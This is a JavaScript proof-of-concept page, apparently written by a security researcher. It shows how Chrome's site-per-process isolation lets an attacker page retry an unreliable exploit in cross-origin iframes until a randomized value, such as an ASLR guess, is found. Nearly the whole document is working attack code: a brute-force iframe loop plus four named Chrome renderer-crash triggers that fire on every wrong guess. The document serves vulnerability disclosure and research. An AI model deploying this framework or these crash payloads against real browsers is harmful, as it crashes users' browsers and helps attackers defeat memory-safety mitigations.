<script>
  // This is a Proof-of-Concept for an attack that uses the `site-per-process` feature to allow an attacker to
  // repeatedly try exploiting an unreliable vulnerability. This effectively allows a brute-force attack against
  // mitigations that depend on randomization (such as ASLR), by giving an attacker an infinite number of tries to
  // guess randomized values.
  
  // This page must be served on the loopback adapter, and can be served on any available port.
  // It takes advantage of the fact that "127.0.0.1" and "localhost" both point to the loopback adapter, but are
  // considered different origins by the browser. You can open this page on either, and it will use the other as a
  // different origin to run the tests in. In a real life attack on the internet, an attacker would have to serve this
  // kind of attack from two different domains, ports and/or protocols in order to create two different origins.
  // Obviously, that should not be a problem.
  
  // In this proof of concept, a test will crash the Chrome renderer unless a correct magic value is supplied. The
  // main page will open such tests in iframes with different numbers until it provides the correct value. This
  // simulates exploitation of a vulnerability where a randomized value must be guessed, and incorrect guesses result
  // in renderer crashes, but correct guesses result in successful exploitation.
  var uMagicNumber = 28, // Magic number to try to find by brute-force, low numbers will be found faster
      nLoadTimeout = 1, // Time to allow each test to run in seconds, lower numbers result in faster testing, but
                        // too low number may not allow each test to complete before the main page assumes it failed
                        // and start a new test. 1 Second seems to be a reasonable trade-off.
      sDifferentOriginHost = location.hostname == "127.0.0.1" ? "localhost" : "127.0.0.1",
      sDifferentOriginBaseURL = location.protocol + "//" + sDifferentOriginHost + ":" + location.port + location.pathname;
  onload = function() {
    if (!location.search) {
      // This is the main page, it opens a test page in a different domain in an iframe in order to try
      // a magic number; once it opens the test page with the correct magic number, the test page will navigate
      // the main page to show the brute-force attack succeeded.
      var uNumber = 0;
      function fTryNumberThread() {
        var oIFrame = document.createElement("iframe");
        oIFrame.src = sDifferentOriginBaseURL + "?" + uNumber++, "test";
        document.body.appendChild(oIFrame);
        var oInterval = setInterval(function () {
          // Wait for the IFrame to start loading the test
          try { if (oIFrame.contentDocument != null) return; } catch (e) {};
          clearInterval(oInterval);
          // Allow the IFrame to run the test for 5 seconds.
          setTimeout(function () {
            // The test failed; remove the iframe.
            document.body.removeChild(oIFrame);
            // Try another number.
            fTryNumberThread();
          }, nLoadTimeout * 1000);
        }, 100);
      };
      // Run test thread; if you have multiple domains, you could run multiple threads simultaniously
      fTryNumberThread();
    } else if (location.search.match(/^\?\d+$/)) {
      document.body.textContent = location.search;
      // This gets opened in an iframe and will crash unless the magic number is provided in the URL.
      // This simulates a vulnerability that is unreliable, but can be brute-forced to succeed, such as
      // an attack against ASLR.
      var sNumber = location.search.substr(1);
      if (sNumber == uMagicNumber) {
        // Correct guess: navigate the main page to stop testing and show the result.
        top.location = sDifferentOriginBaseURL + "?Found magic number " + sNumber;
      } else {
        setTimeout(function() {
          // Chrome Crash 1
          try { console.time(Symbol()); } catch (e) {};
          // Chrome Crash 2
          try { document.createElement("x").animate({"e":Symbol()}); } catch (e) {};
          // Chrome Crash 3
          try {
            var oIFrame = document.createElement("iframe");
            oIFrame.src = "?";
            document.body.appendChild(oIFrame);
            var cSharedWorker = oIFrame.contentWindow.SharedWorker;
            oIFrame.src = "?";
            setInterval(function() {
              try { new cSharedWorker(0); } catch (e) {};
            });
          } catch (e) {};
          // Chrome Crash 4
          try {
            var oTextArea = document.createElement("textarea");
            oTextArea.style="backface-visibility:hidden;padding:7483640ex";
            oTextArea.textContent = "x";
            document.body.appendChild(oTextArea);
          } catch (e) {};
        }, 100);
      };
    } else {
      // This gets opened in the tab when we found the magic number
      document.body.textContent = unescape(location.search.substr(1));
    };
  };
</script>
